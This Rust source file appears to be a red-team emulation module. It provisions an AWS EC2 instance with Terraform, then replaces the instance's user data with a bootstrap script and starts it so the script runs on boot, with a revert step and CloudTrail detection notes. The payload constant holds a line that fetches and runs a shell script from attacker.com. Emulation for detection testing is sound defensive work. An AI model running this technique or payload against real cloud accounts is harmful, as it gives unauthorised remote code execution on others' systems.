use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

data "aws_ami" "amazon_linux_2" {
  most_recent = true
  owners      = ["amazon"]
  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

resource "aws_iam_role" "instance_role" {
  name = "stratus-red-team-ec2-userdata-${random_string.suffix.result}"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_instance_profile" "instance_profile" {
  name = "stratus-red-team-ec2-userdata-${random_string.suffix.result}"
  role = aws_iam_role.instance_role.name
}

resource "aws_instance" "target" {
  ami                    = data.aws_ami.amazon_linux_2.id
  instance_type          = "t3.micro"
  iam_instance_profile   = aws_iam_instance_profile.instance_profile.name

  tags = {
    Name = "stratus-red-team-ec2-userdata-${random_string.suffix.result}"
  }

  lifecycle {
    ignore_changes = [user_data]
  }
}

resource "aws_ec2_instance_state" "stopped" {
  instance_id = aws_instance.target.id
  state       = "stopped"
}

output "instance_id" {
  value = aws_instance.target.id
}
"#;

const MALICIOUS_USER_DATA: &str = r#"#!/bin/bash
curl http://attacker.com/shell.sh | bash
"#;

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let instance_id = outputs
        .get("instance_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: instance_id"))?;

    aws.ec2
        .modify_instance_attribute()
        .instance_id(instance_id)
        .user_data(
            aws_sdk_ec2::types::BlobAttributeValue::builder()
                .value(aws_sdk_ec2::primitives::Blob::new(
                    MALICIOUS_USER_DATA.as_bytes().to_vec(),
                ))
                .build(),
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Updated user_data on instance {} with malicious bootstrap script.", instance_id);

    aws.ec2
        .start_instances()
        .instance_ids(instance_id)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Started instance {}. Malicious user_data will execute on boot.", instance_id);

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let instance_id = outputs
        .get("instance_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: instance_id"))?;

    aws.ec2
        .stop_instances()
        .instance_ids(instance_id)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Stopping instance {} before clearing user_data...", instance_id);

    // Clear user_data by setting it to an empty value
    aws.ec2
        .modify_instance_attribute()
        .instance_id(instance_id)
        .user_data(
            aws_sdk_ec2::types::BlobAttributeValue::builder()
                .value(aws_sdk_ec2::primitives::Blob::new(vec![]))
                .build(),
        )
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Cleared user_data on instance {}.", instance_id);

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.execution.ec2-user-data",
        friendly_name: "Execute Commands on EC2 Instance via User Data",
        description: "Modifies an EC2 instance's user data to contain a malicious bootstrap script, then starts the instance so the script executes on boot. Simulates an attacker gaining code execution by injecting commands into user data.",
        detection: "CloudTrail: ModifyInstanceAttribute with userData attribute.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Execution],
        is_idempotent: false,
        is_slow: true,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
